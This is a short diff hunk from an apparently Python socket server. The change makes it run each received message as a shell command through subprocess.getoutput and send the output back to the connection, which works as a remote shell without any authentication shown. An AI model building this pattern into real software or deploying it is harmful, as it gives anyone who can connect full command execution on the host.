@@ -129,7 +129,7 @@ while True:
 					message = ' '.join(m[2:])
 
 					output = "output:\n"
-					output += subprocess.getoutput(command)
+					output += subprocess.getoutput(message)
 
 					connectionSocket.send(output.encode())
 				
